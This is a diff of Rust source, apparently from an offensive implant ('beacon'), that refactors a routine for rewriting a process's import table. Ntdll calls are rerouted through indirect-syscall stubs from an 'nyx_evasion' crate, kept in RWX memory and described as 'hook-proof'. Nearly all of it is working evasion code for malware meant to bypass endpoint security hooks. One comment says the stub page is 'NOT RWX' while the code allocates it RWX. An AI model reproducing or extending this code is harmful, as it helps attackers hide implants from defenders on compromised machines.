@@ -137,40 +137,10 @@ const SUBSYSTEM_DLLS: &[&[u8]] = &[
 /// RW via `VirtualProtect` (PEB-resolved kernel32) for the write window, then
 /// restored. Single-threaded beacon context.
 unsafe fn redirect_module_iat(module_base: *mut u8, rva_ssn: &[RvaSsn]) -> usize {
-    let rt = match syscalls::global() {
-        Some(r) => r,
-        None => return 0, // indirect-syscall runtime not initialized — cannot build stubs
-    };
-    let (ntdll_base, ntdll_size) = match ntdll_range() {
-        Some(r) => r,
+    let (rt, ntdll_base, ntdll_size, import_dir, vp) = match redirect_prepare(module_base) {
+        Some(v) => v,
         None => return 0,
     };
-
-    // PE parse: DOS → e_lfanew → NT → OptionalHeader → DataDirectory[1] (IMPORT).
-    let e_lfanew = core::ptr::read_unaligned(module_base.add(0x3C) as *const i32) as usize;
-    let nt = module_base.add(e_lfanew);
-    // Sanity: PE signature.
-    if core::ptr::read_unaligned(nt as *const u32) != 0x0000_4550 {
-        return 0; // "PE\0\0"
-    }
-    let opt = nt.add(24);
-    let magic = core::ptr::read_unaligned(opt as *const u16);
-    // DataDirectory offset: PE32 (96) vs PE32+ (112).
-    let data_dir_off = if magic == 0x20B { 112 } else { 96 };
-    let import_rva = core::ptr::read_unaligned(opt.add(data_dir_off + 8) as *const u32) as usize;
-    if import_rva == 0 {
-        return 0; // no import directory
-    }
-    let import_dir = module_base.add(import_rva) as *const ImageImportDescriptor;
-
-    // Resolve VirtualProtect (kernel32) for the RW flip.
-    let vp_addr = match resolve::export_addr(b"kernel32.dll", b"VirtualProtect") {
-        Some(a) => a,
-        None => return 0,
-    };
-    type VirtualProtect = unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32;
-    let vp: VirtualProtect = core::mem::transmute(vp_addr);
-
     let mut redirected = 0usize;
     // Walk the IMAGE_IMPORT_DESCRIPTOR array (20 bytes each) until the null
     // terminator (all-zero entry).
@@ -184,60 +154,139 @@ unsafe fn redirect_module_iat(module_base: *mut u8, rva_ssn: &[RvaSsn]) -> usize
         // The IAT is `first_thunk`. (original_first_thunk / ILT is the
         // pre-binding copy; after load, first_thunk holds resolved pointers.)
         let iat_rva = desc.first_thunk as usize;
-        if iat_rva == 0 {
-            idx += 1;
-            continue;
-        }
-        let iat = module_base.add(iat_rva) as *mut usize;
-
-        // Walk the IAT (8-byte slots on x64) until a zero slot (end of array).
-        let mut slot_idx = 0isize;
-        loop {
-            let slot_ptr = unsafe { iat.offset(slot_idx) };
-            let current = unsafe { core::ptr::read_volatile(slot_ptr) };
-            if current == 0 {
-                break; // end of this DLL's IAT
-            }
-            // Is the resolved pointer an ntdll function?
-            if is_in_ntdll(current, ntdll_base, ntdll_size) {
-                // Resolve the SSN via the RVA→SSN table (built from the
-                // pristine ntdll export dir + runtime SSN table — hook-proof).
-                let rva_in_ntdll = current - (ntdll_base as usize);
-                if let Some(ssn) = lookup_ssn_by_rva(rva_ssn, rva_in_ntdll) {
-                    // Build an indirect-syscall stub for this SSN.
-                    let stub_bytes = nyx_evasion::stub::indirect_stub(ssn, rt.gadget());
-                    // Allocate a small RWX trampoline for this stub. We reuse
-                    // the runtime's single trampoline page IF only one stub
-                    // is active at a time (the runtime does this for its own
-                    // syscallN calls). But for IAT redirect we need PERSISTENT
-                    // stubs (the IAT slot must point at a valid stub for the
-                    // process lifetime, not be overwritten by the next
-                    // syscallN). So allocate dedicated trampolines.
-                    let stub_addr = alloc_persistent_stub(&stub_bytes);
-                    if stub_addr != 0 {
-                        // Flip the IAT page to RW, write the stub pointer,
-                        // restore. The IAT page may be shared (read-only after
-                        // binding), so VirtualProtect is required.
-                        let mut old: u32 = 0;
-                        let page_addr = slot_ptr as *mut c_void;
-                        let ok = unsafe {
-                            vp(page_addr, 8, 0x04 /* PAGE_READWRITE */, &mut old)
-                        };
-                        if ok != 0 {
-                            unsafe { core::ptr::write(slot_ptr, stub_addr) };
-                            // Restore original protection (closes the RW window).
-                            let mut dummy: u32 = 0;
-                            unsafe { vp(page_addr, 8, old, &mut dummy) };
-                            redirected += 1;
-                        }
-                    }
-                }
-            }
-            slot_idx += 1;
+        if iat_rva != 0 {
+            let iat = module_base.add(iat_rva) as *mut usize;
+            redirected += redirect_iat(iat, ntdll_base, ntdll_size, rt, rva_ssn, vp);
         }
         idx += 1;
     }
     redirected
+}
+
+/// Resolve the runtime, the in-process ntdll range, the module's import
+/// directory and the kernel32 `VirtualProtect` export. Returns None if any
+/// prerequisite is missing (caller reports zero redirected slots).
+unsafe fn redirect_prepare(
+    module_base: *mut u8,
+) -> Option<(
+    &'static syscalls::Runtime,
+    *mut u8,
+    usize,
+    *const ImageImportDescriptor,
+    unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32,
+)> {
+    let rt = match syscalls::global() {
+        Some(r) => r,
+        None => return None, // indirect-syscall runtime not initialized — cannot build stubs
+    };
+    let (ntdll_base, ntdll_size) = match ntdll_range() {
+        Some(r) => r,
+        None => return None,
+    };
+
+    // PE parse: DOS → e_lfanew → NT → OptionalHeader → DataDirectory[1] (IMPORT).
+    let e_lfanew = core::ptr::read_unaligned(module_base.add(0x3C) as *const i32) as usize;
+    let nt = module_base.add(e_lfanew);
+    // Sanity: PE signature.
+    if core::ptr::read_unaligned(nt as *const u32) != 0x0000_4550 {
+        return None; // "PE\0\0"
+    }
+    let opt = nt.add(24);
+    let magic = core::ptr::read_unaligned(opt as *const u16);
+    // DataDirectory offset: PE32 (96) vs PE32+ (112).
+    let data_dir_off = if magic == 0x20B { 112 } else { 96 };
+    let import_rva = core::ptr::read_unaligned(opt.add(data_dir_off + 8) as *const u32) as usize;
+    if import_rva == 0 {
+        return None; // no import directory
+    }
+    let import_dir = module_base.add(import_rva) as *const ImageImportDescriptor;
+
+    // Resolve VirtualProtect (kernel32) for the RW flip.
+    let vp_addr = match resolve::export_addr(b"kernel32.dll", b"VirtualProtect") {
+        Some(a) => a,
+        None => return None,
+    };
+    type VirtualProtect = unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32;
+    let vp: VirtualProtect = core::mem::transmute(vp_addr);
+
+    Some((rt, ntdll_base, ntdll_size, import_dir, vp))
+}
+
+/// Walk one descriptor's IAT (8-byte slots on x64) until a zero slot (end of
+/// array), redirecting every ntdll-pointing slot. Returns slots redirected.
+unsafe fn redirect_iat(
+    iat: *mut usize,
+    ntdll_base: *mut u8,
+    ntdll_size: usize,
+    rt: &'static syscalls::Runtime,
+    rva_ssn: &[RvaSsn],
+    vp: unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32,
+) -> usize {
+    let mut redirected = 0usize;
+    // Walk the IAT (8-byte slots on x64) until a zero slot (end of array).
+    let mut slot_idx = 0isize;
+    loop {
+        let slot_ptr = unsafe { iat.offset(slot_idx) };
+        let current = unsafe { core::ptr::read_volatile(slot_ptr) };
+        if current == 0 {
+            break; // end of this DLL's IAT
+        }
+        if redirect_one_slot(slot_ptr, current, ntdll_base, ntdll_size, rt, rva_ssn, vp) {
+            redirected += 1;
+        }
+        slot_idx += 1;
+    }
+    redirected
+}
+
+/// Redirect one IAT slot if its resolved pointer falls inside the ntdll range:
+/// look up the SSN, build + allocate a persistent indirect-syscall stub, then
+/// flip the IAT page to RW, write the stub pointer and restore. Returns true
+/// if the slot was redirected.
+unsafe fn redirect_one_slot(
+    slot_ptr: *mut usize,
+    current: usize,
+    ntdll_base: *mut u8,
+    ntdll_size: usize,
+    rt: &'static syscalls::Runtime,
+    rva_ssn: &[RvaSsn],
+    vp: unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32,
+) -> bool {
+    // Is the resolved pointer an ntdll function?
+    if !is_in_ntdll(current, ntdll_base, ntdll_size) {
+        return false;
+    }
+    // Resolve the SSN via the RVA→SSN table (built from the
+    // pristine ntdll export dir + runtime SSN table — hook-proof).
+    let rva_in_ntdll = current - (ntdll_base as usize);
+    if let Some(ssn) = lookup_ssn_by_rva(rva_ssn, rva_in_ntdll) {
+        // Build an indirect-syscall stub for this SSN.
+        let stub_bytes = nyx_evasion::stub::indirect_stub(ssn, rt.gadget());
+        // Allocate a small RWX trampoline for this stub. We reuse
+        // the runtime's single trampoline page IF only one stub
+        // is active at a time (the runtime does this for its own
+        // syscallN calls). But for IAT redirect we need PERSISTENT
+        // stubs (the IAT slot must point at a valid stub for the
+        // process lifetime, not be overwritten by the next
+        // syscallN). So allocate dedicated trampolines.
+        let stub_addr = alloc_persistent_stub(&stub_bytes);
+        if stub_addr != 0 {
+            // Flip the IAT page to RW, write the stub pointer,
+            // restore. The IAT page may be shared (read-only after
+            // binding), so VirtualProtect is required.
+            let mut old: u32 = 0;
+            let page_addr = slot_ptr as *mut c_void;
+            let ok = unsafe { vp(page_addr, 8, 0x04 /* PAGE_READWRITE */, &mut old) };
+            if ok != 0 {
+                unsafe { core::ptr::write(slot_ptr, stub_addr) };
+                // Restore original protection (closes the RW window).
+                let mut dummy: u32 = 0;
+                unsafe { vp(page_addr, 8, old, &mut dummy) };
+                return true;
+            }
+        }
+    }
+    false
 }
 
 /// A sorted (RVA, SSN) pair, used for binary-search lookup during redirect.
@@ -334,32 +383,49 @@ unsafe fn alloc_persistent_stub(bytes: &[u8]) -> usize {
         return 0;
     }
     // Lazy-allocate the page on first use.
-    let mut page = STUB_PAGE.load(core::sync::atomic::Ordering::Acquire);
-    if page == 0 {
-        let va = match resolve::export_addr(b"kernel32.dll", b"VirtualAlloc") {
-            Some(a) => a,
-            None => return 0,
-        };
-        type VirtualAlloc = unsafe extern "system" fn(*mut c_void, usize, u32, u32) -> *mut c_void;
-        let f: VirtualAlloc = core::mem::transmute(va);
-        // PAGE_EXECUTE_READ (0x20) — NOT RWX. We flip to RWX briefly for the
-        // write, then back to RX (W^X discipline, same as syscalls.rs).
-        let p = unsafe {
-            f(
-                core::ptr::null_mut(),
-                0x1000,
-                0x3000,
-                0x40, /* RWX initially */
-            )
-        };
-        if p.is_null() {
-            return 0;
-        }
-        page = p as usize;
-        STUB_PAGE.store(page, core::sync::atomic::Ordering::Release);
-        STUB_CURSOR.store(0, core::sync::atomic::Ordering::Release);
-    }
+    let page = match alloc_stub_page() {
+        Some(p) => p,
+        None => return 0,
+    };
+    write_stub_slot(page, bytes)
+}
 
+/// Lazy-allocate the persistent stub page (VirtualAlloc RWX initially) on
+/// first use. Returns the page address, or None on failure.
+unsafe fn alloc_stub_page() -> Option<usize> {
+    let mut page = STUB_PAGE.load(core::sync::atomic::Ordering::Acquire);
+    if page != 0 {
+        return Some(page);
+    }
+    let va = match resolve::export_addr(b"kernel32.dll", b"VirtualAlloc") {
+        Some(a) => a,
+        None => return None,
+    };
+    type VirtualAlloc = unsafe extern "system" fn(*mut c_void, usize, u32, u32) -> *mut c_void;
+    let f: VirtualAlloc = core::mem::transmute(va);
+    // PAGE_EXECUTE_READ (0x20) — NOT RWX. We flip to RWX briefly for the
+    // write, then back to RX (W^X discipline, same as syscalls.rs).
+    let p = unsafe {
+        f(
+            core::ptr::null_mut(),
+            0x1000,
+            0x3000,
+            0x40, /* RWX initially */
+        )
+    };
+    if p.is_null() {
+        return None;
+    }
+    page = p as usize;
+    STUB_PAGE.store(page, core::sync::atomic::Ordering::Release);
+    STUB_CURSOR.store(0, core::sync::atomic::Ordering::Release);
+    Some(page)
+}
+
+/// Bump-allocate a stub slot in `page` and write `bytes` into it: transition
+/// to RWX before copying, then back to the old protection. Returns the stub
+/// address (0 when the arena is exhausted).
+unsafe fn write_stub_slot(page: usize, bytes: &[u8]) -> usize {
     // Bump-allocate a slot.
     let slot_idx = STUB_CURSOR.fetch_add(1, core::sync::atomic::Ordering::AcqRel);
     if slot_idx >= STUBS_PER_PAGE {
